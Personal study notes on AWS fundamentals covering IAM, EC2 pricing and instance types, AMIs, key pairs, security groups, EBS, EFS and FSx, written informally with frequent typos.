# CLOUD COMPUTING.
==================

`What is Cloud Computing`: An on demand delivery of IT resources/services over the internet with a pay as you go model or pricing instead of buying, owning and maintaning physical data centres and services.
There are different companies currently providing cloud computing services. 
+ AWS (Amazon Web Services) | Microsoft Azure owned by Microsoft
+ Google Cloud
+ Alibaba Cloud
+ Oracle Cloud
+ IBM Cloud owned by IBM
+ Digital Ocean
+ Salesforce etc

**Benefits of Cloud Computing**
1. `Cost Efficient`: No Physical location needed, Pay as you go Model
2. `Scalability and Flexibility in the Cloud`: Automated BackUps, Easily Accomodate business expansion or new ventures without significant infrastructure changes,  Instantly deploy applications
3. `Disaster Recovery and Business Continuity`: Automated backups, High Availability, Global redundancy
4. `Security`: Advanced threat protection, Compliance, shared responsibility model, maintainace and upgrades
5. `Accessibility and Monitoring`: Can be accessed from anywhere with an internet connection, facilitating remote work and collaboration.

## Introduction to AWS (Amazon Web Services).
============================================
AWS (Amazon Web Services) is a comprehensive cloud computing platform offered by Amazon, providing over 200 fully featured services from global data centers. These services include computing power, database storage, content delivery and various other functionalities that enable businesses and developers to scale and innovate efficiently.
Launched in 2002, AWS has become a leading provider in the cloud computing industry, serving millions of customers worldwide, including sratups, large enterprises and gov't agencies. It's offerings are designed to be flexible and secure, meeting the requirements of organizations with high-sensitivity needs such as the military and global banks.
AWS operates on a PAY-AS-YOU-GO pricing model, allowing users to access resources as needed without upfront capital expenses. This approach facilitates cost-effective scalability and agility, empowring users to experiment and innovate more rapidly.

 Cloud Computing can be divided into 2 models : `Deployment Model` & `Service Model`.


**Deployment Models** : Public | Private | Hybrid Cloud
`Public Cloud`: A deployment model in which cloud computing services are delivered over the internet by third party providers. These services such as computing power, storage and applications are shared among multiple users (known as "tenants") and are accessible to the general public. The provider owns, manages and assumes all responsibility for the data centers and infrastructure. Examples include AWS,Ms Azure and GCP(Google Cloud Platform)
`Private Cloud`: The private cloud deployment model is one in which computing resources are exclusively used by a single org. These resources can be hosted on-premises (within the org's data center) or by the third party provider but remain dedicated solely to that org, ensuring greater control, privacy and security.
`Hybrid Cloud`: The hybrid cloud is a cloud computing model that combines the use of both public and private cloud environments, allowing data and applications to be shared between them. This approach enables the businesses to leverage the scalability and cost-efficiency of public cloud services while maintaning the security of and control of private cloud infrastructure.

**Service Models** - IaaS, Paas, Saas
`IaaS (Infrastructure as a Service)`: These providers offer basic compute, storage and networking resources on-demand, from the cloud, with scalable and elastic capabilities. Users must have control over OS, storage and deployed applications but do not manage the underlysing cloud infrastructure. Examples include Physical and virtual servers, storage and netwokring features
`Paas (Platfrom as a Service)`: Paas providers offer a cloud-based platform that allows developers to build, deploy, and manage applications without dealing with the ubderlying insfrastructure. This services is geared towards software development, providing tools to support the complete web application lifecycle: building, testing, deploying, manah=ging and updating. Paas services like web servers, development tools and data management systems.
`Saas (Software as a Service)`: Software as a Service providers offer software applications over the Internet, typically on a subscription basis. With SaaS, users can access and use software apps hosted on the cloud infrastructure via web browsers without worrying about installation, maintenance or infrastructure. This model model includes applications like email, Customer Relationship Managment (CRM) systems and collaboration tools.
`Infrastructure as Code (IAC)`: This is a services where you deploy your infrastructure using code.

**AWS Terminologies**
`Data Centre`: A data center is a centralized facility or a physical location used by org or company to house/keep and manage their IT infrastructures, including servers, storage systems, networking equipment and other critical components for storing, processing and disseminating(distributing) data and apps.
AWS has it's own data centers and they offer the cloud  services over the internet from this physical locations, customers, companies, organizations store their data in this physical location and they refer to it their data centers as `AVAILABILITY ZONES`

`Regions`: In AWS, a region is a geographical area where AWS has multiple data centers (availbility zones). Each region is designed to be completely isolated from other regions to ensure fault tolerance and stability. AWS operates multiple regions globally and each region consists of multiple availability zones.
+ Each region is identified by a unique name (e.g)
+ Regions are composed of multiple availability zones (data centres)
+ AWS services are typically deployed globally across multiple regions to provide redundancy and improve performance for users located in different geographical locations.

`Availability Zones`
An availability zones (AZ) is one or more discret data centes within a region. These AZs are interconnected through low latency links but are physically seperated from each other. This physical seperation is important for providing redundancy and resilence. If one availbility zone within a region experiences a failure, the other azs in the same region can continue to operate independently, ensuring high availability and fault tolerance for apps and services hosted iN AWS.

Region: us-east-1 azs include: `us-east-1a`, `us-east-1b` etc

`Why did AWS introduce Multi - AZ`
+ High Availability
+ Disaster Recovery
+ Compliance and Data Residency
+ Fault Tolerance
+ Scalability


`Virtualization`
Cloud providers like AWS, Azure, GCP are using the technology called Virtualization to offer I.T services over the interent. Virtualization in AWS or cloud computing refers to the practice of creating virtual instances of computing resources such as servers, storage, networks and apps which are then delivered over the interent. This allows users to access these resources on-demand without the nedd for physical hardware infrastructure.

In AWS, virtualization is achieved through technologies like `Amazon Elastic Compute Cloud (EC2)`.(computers or you can create on on aws) for virtual servers, Amazon Simple Storage (S3) for virtual storage amd Amazon Virtual Private Cloud (VPC) for virtual networks. These services abstract the underlying hardware and provide users with scalable and flexible computing resources that can be easily provided and managed via a web interfacebor API.

Virtual Machine (VMs): A VM is a software-based emulation or imitation of a physical computer that runs its own operating system and apps. VMs are created and managed by the `hypervisor` and can be provisioned, cloned, migrated and scaled as needed.


`AWS has different services and it has categorized them based on scope or reach within the aws ecosystem or infrastructure`
1. Regional Services: 
2. Global Services:
3. Zonal Services

===========================================================================================================================

## IAM:: Identity and Access Management
This is a global service | It is one of the core services provided by AWS | We can classify it under --> security and access mgt.
`definition`: IAM stands for Identity and Access Managament and it's a core service provided by AWS that enables you to manage access to AWS resources securely. IAM allows you to control who can access your AWS resources (authentication) and what actions they can perform on these resources.
+ User Mgt
+ Group Mgt
+ Roles 
+ Policies
+ MFA

IAM is a service that helps us to manage users, groups , other services and how they interact with our AWS acc and resources in the account.

`User Mgt`: A user is aws is anyone that can access or manage your aws resources. For a user to manage or access your aws resources, you will need to provide them permission. A user can manage these resources through 2 way (GUI or CLI). In aws, a user or a grouo of users can access the GUI using the `aws console` or a user can use the  CLI.


Steps to grant Access for a user using CLI
+ Open IAM and click on the user
+ Scroll down and click on create access key
+ Install the AWS CLI
+ Verify the Installation
+ Setup access by running
    `aws configure`: - It will prompt you for the access key and secret access key
                     - Set your default region
                     - Enter format as 'json' and press enter

`Security Best Practice in IAM`
+ As a best security practice, once you create an AWS acc, stop signing with a root user and create an IAM user and login with the IAM user.
+ Rotate access every 90 days. This helps to prevent compromised keys usage.
+ Manage users using groups as much as possible.
+ Regular permission audits (dormant, unused keys - quarterly etc)
+ Use Customer Managed Policies for production workloads as opposed to AWS Managed policies.

**IAM User Groups**
An IAM user group is a collection of IAM users. You can use groups to assign permissions to multiple users simultaneously.
+ It is good practice to assign permissions to users in groups as much as possible.
+ You can add users to a group upon creation of the group. Users inherit
+ A single user can belong to multiple groups and by default, the user will have permissions to all the groups they are added in.
+ You can attach more than one permissions or policies to a user.

**Benefits of Managing Permissions (users) Using IAM groups in IAM**
1. `It simplifies permission management`
+ It has centralized control of permissions this is possible because by attaching a policy to the group, It automatically applies to all the users in the group. 
+ Assigning users to groups and attaching a permission to the group makes sure there is consistency accrosss all users. All users will have the same permissions unlike if one were to manually assign permission to users you could make a mistake or forget to grant a user a required permission.

2. `Managing users using Groups makes it Scalable`
+ It makes onboarding and off-boarding easy. When a new user is added/removed to/from the company, adding them to the group speeds up the process.

3. `Enhances Security`
Using groups enhances security by following the principle of least privillege access. It makes it easy for auditing - Auditing groups is easier than auditing individual users. 
Least Privillege access entails providing a user/group with only the permissions needed to carry out a certain task.

**IAM Policies** - These are simply permissions you can grant to users or groups tp carry out tasks or their job functions in your aws acc. e.g permission to create an EC2 instance, or s3 bucket.
Def: A policy is a JSON doc that defines permissions. This document specifies which actions are allowed or denied on which resource or resources and under what conditions a user can manage them.

*What is a Managed Policy ?*
A managed policy is a standalonene IAM policy that you can attach to multiple users or roles.
There are 2 types of managed policies - AWS Managed policies and Customer Managed policies.
1. `AWS Managed policies`
+ When you create an AWS acc, it comes with default policies and these policies are reffered to as `AWS Managed policies`.
+ They are managed and control by AWS e.g AdministratorAccess etc
+ To make them unique, they show up as the type `AWS managed` on the console and usually have a yellow logo beside it.

Pros.
+ Pre-built and easy to use.
+ Automatically updated by AWS when new services/features are added.

Cons
+ Too broad for production workloads and not really good for leat preivillege access.
+ You can not edit or modify the policy. Can only be attached to a user or group.

2. `Customer Managed Policy`
Users have the ability to create their own custom IAM poilicy which is referred to as `Customer Managed Policy`

Pros
+ Fully customizable. Can be edited or updated to match or follow least privilleged access
+ Best for production workloads as opposed to AWS Managed Policies since they serve just as a starting point.

Cons
+ Manual Updates and changes

3. `Inline Policies`
+ An inline policy is one created and managed by the user. 
+ Can be directly embdedded to a single user, a group or a role.
+ Unlike AWS Managed Policies (standaline + resusable), inline policies are one-to-one with the entity.
+ Once a user/group or role is deleted, the inline policy does to.
+ Not resuable: Cannot be shared with another entity.
+ Good for exceptions: Special permissions unique to one user/role.

`When to use inline policies`
- Specific cases for particular scenarios with users.

Steps to create a policy
- Click on IAM -> Policies 
- At the top right, click on `create polcies`
- Specify the permissions on your policy editor. There are 2 ways to do this: `Visual` OR `JSON` format
- Add permissions for the policy and give it a name and description.


**IAM ROLES**
+ Grants temporary permissions (entities - users, groups, aws resources).
+ IAM roles when created will need to be attached with an IAM policy ( Customer Managed or AWS Managed).
+ Principal: This is who has the permission to access use the role.

`What is an IAM Role`
It is a set of permissions as AWS Services, User, Groups assume temporary which allows or deny wc actions they can perform on a resource. Roles are good for resource to resource authorization. This means if you want two resources to share data for authorization, its highly recommended to use IAM roles instead of IAM Policies. IAM roles unlike an IAM user that has access keys, passwords attached to them, IAM roles do not have any long term credentials attached to them.

IAM -->username and (password (AWS CONSOLE) / Access Keys (CLI)  )  -->
`Authentication` password and access keys <--> `Authorization` (attached IAM policies) -- Long term credentials

IAM ROLES do not have permanent credentials instead, with IAM roles, you `assume` it as AWS gives you temporary credentials

Analogy
=======
An IAM ROLE is like a temp badge given to do a job e;g Entering a secure building to fix electrical equipment, a security guard issues the temp badge. One can use the badge to access specific areas in the building but must return the badge when all the work is completed. An IAM ROLE grants temp permission to a user, group or aws services (known as entities) to have access to specific resources within the aws acc when carrying out a task and will stop using the tempoarary permission when the task is done and if they were to re-use the IAM ROLE again, AWS totates the access credentials which makes it safe.
+ IAM USER: Employee with permanent badge who can have access to some areas in the building.
+ IAM ROLE: Visitor badge that you can borrow or given by security to be use temprarily and returned later.

`Use Cases for IAM ROLES`
+ EC2 instances to access S3 or DynamoDB without storing keys.
+ Cross-account access (Account A lets Account B assumes a role).
+ Services like Lambda, ECS or EKS that need permissions temporarily.
+ Resources to resource authorization (Temporary permission).
+ Third party services or apps can assign them IAM roles

Entities which can be given IAM roles in AWS include:
+ AWS service (EC2, s3, cloudfront, cloudwatch)
+ An or another AWS account (6373687838)
+ Web 


NB: An IAM roles can be broken into 3 parts namely : Trust Policy, Permission Policy and Session.
1. `Trust Policy`: This defines who can assume(use) the role. (In our analogy, this who refer to the security who is in charge of controlling who gets the temporary badge)
2. `Permissions Policy`: Defines what actions can be performed when using the role such as Read/Write Access to an S3 bucket - we can attach this permission policies to the role. These are managed policies(aws and customer managed policies) (In our analogy, which areas can access using the temp badge)
3. `Session`: Once a role is assumed, AWS issues a temp security credentials valid for a limited time which usually ranges from 15 mins to 12 hours.


Assume Role Process (Behind the scene).
--------------------------------------
You (or an AWS service) sends a request to the AWS STS(Security Token Service). --> STS issues a temp keys.
The keys are then used to interact with AWS services until they expire. 


1. How do you enhance security in AWS ?
+ Use IAM users over logging in with the root user.
+ Enable MFA for all users.
+ Define policies for users with Least Privillege Access.
+ Rotate user access keys every 90 days.

**Account Settings**
`Password Policy`: This helps you setup a strong password requirement
`Centralized Root Access for Member Accounts`
+ Every AWS acc comes with a root user (email + password during the creation of the account)
+ The root user has unrestricted access (full permissions, cannot be limited with IAM policies or SCPs - service control policies)
+ If many people have access to multiple root accounts, it becomes a security risk.

**ACCESS ANALYSER**
This is a feature in IAM that helps you to identify resources in your aws acc and orgs such as Amazon S3 bucket or IAM roles, that are shared with the external entity. It uses logic-based reasoning to analyze resource-based policies, IAM policies and other control mechanisms to provide a detailed report on resources that are accessible from outside your AWS account.

+ Resources Analysis
+ Policy Validation
+ Continious Monitoring
+ Displays detailed findings

`External access`: Analyses extrnal entities having access to your aws resources.
`Unused access`: This are access that have not been active for a number of days.

**Benefits of Using Access Analyser**
+ It improves security by helping ti identidy any access with external entities and help mititgate or prevent any unintended access to you aws account.


## Cloud Purchasing Options.
1. **On-Demand**: Pay as you go: most common

2. **Reserve Instances**

3. **Spot Instances**
This are instances that aws allows you to place a bid to unused EC2 capacity and you will be able to run the instances as long as your bid exceeds the current spot price. Spot instances and their prices are set up by AWS these prices will fluctuate based on demand for the instances. AWS offers 90% off demand rates
+ However, even though it's cost savings, cheaper , the instances can be interupted by AWS with a two minute warning when the capicity is needed for on demand instances.
`Use Case`: Temporary tasks, apps that are flexible, fault tolerance, handle interuptions, data analysis.
`Why use spot instances`
+ Flexible - can run on many types of instances.
+ When your workload can handle interuptions.
+ High discounts.

`How do spot instances operate`
+ A request for a spot instance is made.
+ AWS checks if spare capacity is available.
+ Instance runs until AWS reclaims it when capacity is on demand.
+ If capacity is needed elsewhere, AWS sends a 2-minute termination notice.

`Spot Pricing`
+ Dynamic pricing -> based on AWS supply/demand.
+ You set a max price (your bid)
+ If spot price goes above your bid -> instance is reclaimed.
In practice: AWS keeps prices stable now but interuptions still happen.

`Advantages`
+ Up tp 90% cheaper.
+ Great for parallel, distributed workloads.
+ Works with ASG, ECS, EKS, AWS Batch.

`Disadvantages`
+ Can be interupted anytime.
+ Not reliable for databases or stateful apps.
+ Availability varies by regioan/instance type.


4. **Savings Plan**
If offers significant savings and more flexible than reserved intances. You can reserve an instance for 1-3 years. You will commit to consistent amount of usage ($/hr) for 1 year or 3 year term. $0.53/hr. With the saving plans it offers lower prices on EC2 instances regardless of the instance family, size, OS, tenancy, aws region in exchange the above commitment of usage.
`Note`: Instead of committing to a specific instance (like reserved instances), you commit to a dollar amount of usage per hour.

**How Savings Plan work**
`Example`
Commitment: $5/hour for 1 year.
Actual usage: $7/hour.
You pay: $5 at discounted rate + $2 at On-demand.

`Analogy`
+ On-demand = buying groceries per item.
+ Reserved instances = signing a contract for one type of grocery each week.
+ Savings Plan = A prepaid meal plan where you choose what to eat, but you already committed to spending a certain amount.


5. **Dedicated Hosts**
A dedicated hosts is a physical server with EC2 instance capacity fully dedicated to your use. Dedicated host allows you to use software license and can help you meet compliance requirements. Unlike EC2 that will run on a shared hardware, dedicate hosts gives flexibility and control how instances are placed on the server, You casn install your own software like windows servers, linux etc
`Use Case`: Scenario where you want EC2 instances to be physically isolated at the host hardware level from instances that belong to other AWS accounts. When a company is subject to meet certain policies or regulatory policies.
`Pricing`: Varies based on instance family, region and payment option you choose. You can pay to own the entire host, its expensisve whereas dedicated instances which are cost effective.
`Why use dedicated Hosts`
+ Compliance: Needed for regulations that require workloads to run on dedicated hardware  (HIPAA, PCI, DSS, FedRAMP).
+ Licensing: Lets you use existing server-bound software licenses (Windows Server, SQL Server, Oracle) tied to sockets, cores, or physical servers.
+ You can see the physical sockets, cores and host IDs for tracking.

6. **Dedicated Instance**
A dedicated instance are EC2 instances that are physically isolated at the host hardware level from instances that belong to other aws account (customers). However, unlike dedicated hosts, you do not have control over instances placements and cannot use your software existing license.
`Benefits is to enhance security by ensuring strict isolation`

`Analogy`
A Dedicated Host is like renting an entire parking garage, where you decide where each car parks inside. 
A Dedicated Instance is like having a reserved parking spot in a private garage, but you don't control which specific spot you get each time you use it. 

NB
`Single-Tenant`: No other customer shares the physical hardware.
`AWS-controlled placement`: You don't see sockets/cores like in dedicated hosts.

7. **Capacity Reservations**
This is when you can reserve a number of EC2 instances in a specific AZ for any duration.
`Use-case`: This is vital when you always want the capacity needed for your critical apps.
`Price`: The price here is charged based on the demand rates.
`Focus`: Capacity assurance (not discounts)
`Analogy`: On-demand --> you walk into a restaurant and hope there is a table available.
           Capacity Reservations: You walk into the restaurant and the table is reserved and paid for whether used or not.

## Summary
+ Flexibility: On Demand
+ Predictability, Long term usage: Reserved instances and Savings plans.
+ High Cost savings and flexible workloads: Spot Instances.
+ Compliance and Licenses: Dedicated hots or dedicated instances.
+ Guaranteed Capacity: Capacity Reservations.



# AMAZON ELASTIC COMPUTE (EC2)
A virtual machine in AWS is called EC2 (Elastic Compute).
A virtual machine in Azure is called Virtual Machine.


## INSTANCE TYPES
`What is an Instance Type`: An instance type is a model or blueprint defines the hardware configurations of your EC2 instance including
+ CPU (vCPUs).
+ Memory (RAM).
+ Storage type (EBS volumes).
+ Network Performance.

NB: Select and instance type based on the workload you are expecting.
AWS has catergorized the instances based on use cases.
1. General Purposes: Genral purpose instances provide a balance of `compute, memory, and networking resources`. These instances are ideal for apps that use these resources in equal proportions such as web servers and code repositories.
Gen Purpose families (A/M/T families)
+ Balanced CPU, memory , networking.
+ Best for: Web servers, app servers, dev/test.
+ Example: t3.micro (free tier), m5.large
2. Compute Optimized: Compute optimized instances are designed for compute instensive apps that benefit from high performance processors. These instances are ideal for batch processing workloads, media transcoding, high performace web servers, high performance computing (HPC), scientific modeling, dedicated gaming servers, ad servers engines and ML Inference e.g `C-family`
+ High CPU-to-memory ratio
+ Example: c5.large
3. Memory Optimized: Designed to deliver fast performance for wokrloads that orocess large data sets in memory e.g `R, X, Z family`
+ Large Ram capacity.
4. Storage Optimized: Designed for workloads that require high, sequential read and write access to very large data sets on local storage.They are optimized to delover tens of thousands of low-latency, random I/O ops per sec (IOPS) to apps e.g `I, D, H family`
+ High disk throughout (NVM SSDs).
+ Best forL Big data, No SQL Dbs, Hadoop clusters.
+ Example: `i3.large`
5. Accelerated Computer Instance (P/G/F/Inf/Trn family): Accelerated computing instances use hardware accelerators, or co-processors, to perform functions, such as floating point number calculations, graphics processinf or data matching, more efficiently than is possible in software
+ GPUs, FPGAs, ML/AI chips
+ Best for: ML, Graphics Rendering, AI model training.
+ Example: p3.8xlarge, inf1.6xlarge.
6. High Performance Instances: High performance computing instances built to offer the best performance for running for HPC workloads at scale on AWS. These instances are ideal for apps that benefit from high performance processors such as large, complex simulations and deep learning workloads e.g HPC

REFERENCE: https://docs.aws.amazon.com/ec2/latest/instancetypes/mo.html

**AMI: Amazon Machine Image**
It is a pre-configured template (file) contains software configs (OS, App Server, apps and related configs or dependencies) required to launch a virtual machine (EC2 instance).
`What you need to know when it comes to AMI`
- Template for your EC2 instance. This is pre-configured OS or app for your VM.
- Users can customize AMI to match their specific needs and they can also modify exisiting AMI.
- You can use a single AMI to create mutltiple ec2 instances with the same AMI configurations.
- There are private AMI and public AMIs(can be seen by everyone).
- AMI can be build from a snapshot.
- AMI are built in specific regions and can be copied from one region to another and from one aws acc to another.
- You can AMIs from AWS market place

Types of AMIs
+ AWS -Provisioned AMIs - Basic Images like Amazon Linux, Ubuntu, Windows Server - Maintained by AWS and updated regularly
+ Marketpalce AMIs: Provided by third parties (e.g Palo Alto firewall, RedHat Enterprise, WordPress).
+ Commuinity AMIs: Shared by other AWS users. Use cautiously (security risk of not vetted).
+ Custom AMIs: Built by you (or your org). Packer, Include pre-installed risk if not vetted. Example: A company image with antivirus and compliance tools.

**Best Practices when using AMIs**
- Keep them updated = Patch base images regularly.
- Use golden AMI - Standard company approved images.
- Automate - Use EC2 instances AMI builders.




**KEY PAIRS**
In AWS, a Key Pair is a set of security credentials used to log in securely to an EC2 instance.
It consists of a public key (Stored in AWS) and private key (kept by you).

`How do Key Pair works`
When you want to launch an EC2 instance
+ Select an existing keypair if you have one already (or create) a Key Pair.
+ AWS installs the public key on the instance.
+ Download the private key file(.pem) to your local machine.(downloads folder)

Note:
+ An ec2 instance without a key pair won't be able to be connected to via SSH but you can still login to the server using different methods.
+ You can use a single keypair on several ec2 instances and you can use the different keypairs on different ec2 instances.
+ When naming a key pair, use single name, do not put spaces in the naming convention.
+ To be able to login you need to change the key permissions and you need to be in the location where the key is.
+ To login into the EC2 instance through SSH, security group inbound rule port 22 must be open. The common troubleshooting error you will see when connectivity problems arise like ports `Operation timed out`. - check security groups or NACL(Network Access Control List)

**Other methods of logging into an EC2 instance without using SSH**
1. `EC2 instance connect`: The ec2 instance must be in the public subnet and has a public IP address and use a user name. The default username is Ubuntu if you are using an ubuntu server.
2. `Session Manager`: With Session manager you can connect to your ec2 instance without Key Pairs.
+ Connect to your instance without SSH keys, a bastion host or opeining any inbound ports.
+ Sessions are secured using AWS Key Mgt (KMS - used to encrypt data)
+ You can log session commands and details in an Amazon S3 buvcket or Cloudwatch


`Note`: You can use a single IAM role with SSM permission and attached on multiple ec2 instances to login through session manager.

3. `EC2 Serial Console`: Not commonly used.
4. RDP(Remote Desktop Protocol): This logs into the server which gives a GUI for your server.

`STEPS TO SETUP YOUR RDP connection`
+ Install update your server: `sudo apt update`
+ Install xrdp server: `sudo apt install xrdp`
+ Enable it sudo systemctl enable xrdp then sudo systemctl start xrdp then echo xfce4-session > ~/.session then sudp systemctl restart xrdp
+ Start the xrdp service and enable it so that when we reboot our system, it will be running.
+ Connect to your EC2 instance and AWS resources using CLOUDSHELL.

===========================================================================================================================
**Security Groups in EC2 instances**
+ Security Groups are what we call `Virtual Firewalls`. This controls the network traffic in and out of ec2 instance called `inbound` and `outbound` traffic.
+ It helps protect what gets in and what gets out : security at the instance level.
+ By default, when you create an instance, it comes with a default security group.
+ You need port 22 inbound rule open on your security group before the user can ssh into the ec2 instance.
+ A security group must be attached to a VPC (Virtual Private Cloud).
+ When you configure a source like 0.0.0.0/0: it means you are allowing access from anyone and anywhere. This is not recommended and not a good security practice.
+ Apart from using the source as IP address cidr like (0.0.0.0/0 or 123.495.697/32), you can also configure the source as a security group id sgr-08aegusvdhv800c5f
+ Security group are `stateful` in nature. If it allows inbound request, then it automatically allows outbound traffic.
+ When you create a security group, by default it denies all inbound traffic and allow all outbound traffic.

Summary of Security Groups.
---------------------------
- Virtual firewall: controls network traffic in and out of your ec2 instances.
- Security groups are stateful, this means that mean if inbound traffic is allowed, it automatically allows outbound traffic.
-  It has inbound rules and outbound rules: Inbound rules define which traffic can reach the instance, while outbound rule defines what traffic can leave ec2 instance.

Best Practices.
--------------
+ Avoid using cidr ranges 0.0.0.0/0
+ Use a single security group to manage ssh connections and seperate security group to manage other applications.
+ Moninitor security groups.

`Interview Question`: What is the difference between a security group and NACL (Network Access Control List) ?
- Security groups control traffic at the instance level and NACL is at the subnet level.
- Security groups are stateful (inbound and outbound) while NACL is stateless.
`While should we set outbound rules if by default security groups are stateful` ?
+ For restricting outbound traffic to particular sources.
+ To prevent data exfiltration, that is allowing sensitive data to be send out to bad actors.
+ For compliance purposes, if your company needs restriction for inbound and outbound traffic at instance level.
`Can a security group be attached to multiple ec2 instances`
+ Yes, especially if they are in the same region

Imagine a web APP: Inbound: load balancer security group  Outbound: load balancer security group
===========================================================================================================================

**EBS VOLUMES**
+ (Elastic Block Store) is a scalable, high performance block storage. This is compared to a hard drive on a physical hard drive on a physical computer.
+ Persistence: Data remains even if the EC2 instance stops or terminates (except `instance store volumes`, which are ephemeral).
    - Ephemeral: Data is is lost when the instance is stopped.
    - Persistent: Data remains after the instance is stopped.

Question: `What happens to an EC2 instance store when you stop the EC2 instance. ?`
Answer: `Instance stores are Ephemeral: Data is is lost when the instance is stopped.` 

**Features of an EBS Volume**
1. `Persistent Storage`: EBS volumes can persist data regardless of the lifecycle of the ec2 instance. ie if you shutdown the intance and restart you won't lose data.
2. `Easy to Scale`: You can increase the size of the ebs volume, create new ebs volumes and attach to ec2 instances.
3. `Highly avaialable & Durable`: They can be replicated across different AZ (data centers) by creating snapshots. `Snapchots are simply a replica of the current state of your EBS volume which can be used for point-in-time recovery.` You can use snapshots to backup data, migrate data. When you take a snapshot of your EBS, it is stored in an S3 bucket. Snapshots are incremental backups, this means only the blocks (data) that was not previously captured in the snapshot will be captured.
4. Performance Options: EBS has different types of options you can select base on the storage perfomance. such as (`General Purpose SSD, Provisioned IOPS SSD, Throughput Optimized HDD, Cold HDD, Magnetic Standadrd`)

+ Create an EBS volume or see the one for your current EC2 instance.
1. Backup EBS volumes (snapshots) and disaster recovery --> Point on time recovery.
    (Created an snapshot from an ec2 instance as backup, we created an EBS volume from the snapshot, and attached the EBS volume to a new ec2 instance and then access the data).
2. How to encrypt and Unencrypted EBS volume
    - Create a snapshot from the unencrypted EBS volume. Then create a volume from the unencrypted snapshot at creation you can then encrypt the EBS volume and attached to your EC2 instance.
3. Migrate data from one instance to another using EBS volume. (Just like data back up recovery)
4. Move an EBS from one account or region to another.
    - Select EBS snapshot and move it to preffered region.


**Types of EBS volumes**(based of performance)
1. `General Purpose (gp2, gp3)`: This is an AWS storage that can be used for multi-purpose use by balancing it with price and performance. It is good with different varieties of workloads and apps and gp3 volumes (storage) offer high performances and lower cost than gp2.
    + Cost effective.
    + It's good for system boot volumes, virtual desktops, development and test environment.
2. `Provisioned IOPS(input/output operations per second) SSD(io2/io1)`: This EBS volume type is designed for I/O - intensive apps such as Databases b/c they need persistent, consistent and higher IOPS. io2 offers higher durability than io1.
3. `Throughput Optimized HDD (st1)`: It is designed to handle frequently accessed through intensive workload and low cost e.g: Data Warehousing, log processing.
    `Throughput` in this context of computer networking and storage means when data is succesfully transferred from one location to another and its measured in bits per second (bps), mega-bits per second(mbps), giga-bits per second(gbs).
    `High throughput`: High rate of transfer.
    `Low throughput`: Low rate of transfer.
4. `Cold HDD (sc1)`: Designed for less frequently accessed data. This good for scenarios where price is more of a concern than performance. e.g good for saving backup files or files servers in ec2.
5. `Magnetic Standard`: It is the previous generation of HDD. This EBS type is not recommended due to it's lower performance and its high cost when compared to other new EBS storages.

**How to Scale and EBS volume**
Scale ----> Up or Down   --- Horizontally or Vertically.
`Vertical Scaling(Up / Down)`: This mean you are increasing or decreasing the resources(storage, Cpu, Memory) of a specific resource. example: Inceasing an EBS volume from 8GB to 10GB.
    `Note`: EC2 instances when created come with a default EBS volume based on the instance type that was choosen. Based on this, you can only increase the resources but not reduce b/c there is a minimum EBS volume needed for that type of instance to run.
`Horizontal Scaling(Out / In)`: Adding or removing more resources to work in parellel to the workload.
Example is having an ec2 instance running your a web application in auto-scaling group and once there is a ot of traffic, your auto scaling creates more instances to handle the spike traffic.


All ec2 instances comes with a root volume.
`Root volume`: The root volume is reffered to as the primary storage device attached to a virtual machine(ec2 instance). It contains the OS, system files and any other dependencies that requires the instace to function
    `If you detach an EBS volume, the virtual machine cannot start because ebs volumes store the primary system files needed to boot up the ec2 instance(virtual machine).`
`Data Volume`: This is refered to storage volume primarily used for storing application data, user data, and any other type of non system data.
`What is Data`: This any information that can be stored e.g name can be data, files can be data. Data can be classified (Senstive(only authorized users can be have access to it) or non sensitive data (anyone can see or have access to it))

**EBS Snapshots**
`What are snapshots`: This is a copy or replica of your EBS volume.
    By default, when you create an aws acc, ec2 ebs encryption is turned off, you will need to manually turn it on. What happens if you have already created EBS volumes with encryption not turn on.
**Snapshots can be used for various purposes**
+ Data protection and point in time recovery.
+ Data Migration.
+ Compliance and Auditing: SOC(Security Operations Compliance docs and guidelines in place to be followed by companies in order to pass complaince review,(SOC1, SOC2)), HIPPA
+ System Maintenance: It is good to take snapshots when doing system upgrades so you can easily rollback.
+ Backing Up data
**EBS Snapshot Recycling Bin**: 
This is a bin that keeps track of all deleted snapshots of EBS volumes and AMI's. This can be useful in case of unientional deletions. To set this up, you create a `retention rule` that specifies the various duration and settings on how they can be stored.

`What is Encryption`: This simply turning plain text into cipher text. This is when you mask or hide sensistive data from non authorized users using what we call `encryption keys`.
`Encryption at Rest`: This is when the data is stored in a storage and not moving and its secured using encryption keys.
`Encrption at Flight`: When the data is moving from one location to another.

**How to encypt an existing EBS volume that has not been encrypted** -- see uploaded site notes.
**How to encrypt and unencrypt an EBS volume** -- see uploaded notes.
**How to attach the new EBS volume** -- see uploaded notes.


**Life Cycle Manager**
This is a feature that helps you to automate the creation, retention and deletion of EBS snapshots and AMI's
Think of it as `a schedule manager` that makes sure backups (snapshots) happen regularly and old ones are deleted automatically. It simplifies backup management and ensures compliance (no manual snapshot clean up)
`Note`: The life cycle manager is free but you will incure charges for the snapshots that are bing created by the policies.

+ You can create a life cycle policy to automatically take snapshots on your behalf at a specific time.
+ You can create a custom policy and or use a default policy.
+ For custom policies, you can create an 
    1. `EBS SNAPSHOT POLICY`: This policy creates EBS SNAPSHOTS automatically.
    2. `EBS AMI BACKED CUSTOM POLICY`: This policy creates AMI SNAPSHOTS automatically.
    3. `CROSS ACCOUNT COPY EVENT POLICY`: This policy creates EBS & AMI SNAPSHOTS and sent them to other accounts.



**(EFS)Elastic File System**
These are large block storage provided by AWS to allow for file sharing. The can be mounted on to one or several EC2 instances in order to enable  sharing.


**Differences between EFS and EBS olumes**
| Feature            | **Amazon EBS (Elastic Block Storage)**             | **Amazon EFS (Elastic File System)**
|--------------------|----------------------------------------------------|----------------------------------------------------------------
| **Storage Type**   | Block-level storage (like a virtual hard disk).    | `File-level` storage using NFS protocol |
| **Accessibility**  | Attached to **one EC2 intance** at a time (per AZ> Multi-attach only for io1/io2 in the same AZ. | Can be mounted by **multiple EC2 instances** across AZs)   |
| **Scalability**    | Manual Scaling (up to 64 TiB. Must resize and expand FS). | Automatically scales up/down with usage (petabyte scale). |
| **Performance**    | Consistent, low latency performance. Volume types: gps, io1, io2, st1, sc1 | Throughput scales with size. Supports bursting & provisioned throghput. |                


**Amazon FSx**
It is a file storage service offered by AWS and it is a `fully managed service` and its to launch and run popular file systems with good performance security. It can be used for different use cases. FSx provides fully managed third party file systems for native compatibility (match) and features.
**Different files systems under Amazon FSx**
- FSx for BetApp Ontap
- FSx for OpenZFS
- FSx for Windows File Server
- FSx for Lustre

1. **Fsx for Windows File Servers**
+ This is a fully managed windows file system share drive
